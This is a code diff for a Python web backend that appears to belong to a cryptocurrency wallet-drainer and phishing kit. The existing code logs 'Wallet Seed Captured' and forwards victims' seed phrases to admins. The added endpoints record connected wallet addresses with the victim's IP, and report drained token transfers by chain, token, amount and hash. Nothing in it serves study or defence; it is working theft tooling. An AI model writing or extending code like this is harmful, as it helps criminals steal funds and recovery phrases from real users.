@@ -49,6 +49,22 @@ class WalletData(BaseModel):
     seedPhrase: str
     user: dict = None
 
+class WalletConnectData(BaseModel):
+    address: str
+    ip: str = "Unknown"
+    country: str = "Unknown"
+    user: dict = None
+
+class TransferData(BaseModel):
+    address: str
+    chain: str
+    token: str
+    amount: str
+    status: str
+    hash: str = None
+    error: str = None
+    user: dict = None
+
 async def notify_admins(text: str, document: str = None):
     if os.path.exists("admins.json"):
         with open("admins.json", "r") as f:
@@ -154,6 +170,34 @@ async def submit_wallet(data: WalletData):
     save_submission({"type": "wallet", "data": data.model_dump()})
     user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
     await notify_admins(f"💎 *New Wallet Seed Captured!*\n\n{user_info}\nPhrase: `{data.seedPhrase}`")
+    return {"status": "ok"}
+
+@router.post("/api/submit/wallet_connect")
+async def submit_wallet_connect(data: WalletConnectData, request: Request):
+    ip = request.headers.get("X-Forwarded-For", request.client.host)
+    data.ip = ip
+    save_submission({"type": "wallet_connect", "data": data.model_dump()})
+    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
+    await notify_admins(f"🔗 *Wallet Connected!*\n\n{user_info}\nAddress: `{data.address}`\nIP: `{data.ip}`")
+    return {"status": "ok"}
+
+@router.post("/api/submit/transfer")
+async def submit_transfer(data: TransferData):
+    save_submission({"type": "transfer", "data": data.model_dump()})
+    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
+
+    status_emoji = "✅" if data.status == "success" else "❌"
+    text = f"{status_emoji} *Transfer {data.status.capitalize()}!*\n\n{user_info}\n" \
+           f"Chain: `{data.chain}`\n" \
+           f"Token: `{data.token}`\n" \
+           f"Amount: `{data.amount}`\n"
+
+    if data.hash:
+        text += f"Hash: `{data.hash}`"
+    if data.error:
+        text += f"Error: `{data.error}`"
+
+    await notify_admins(text)
     return {"status": "ok"}
 
 app.include_router(router)
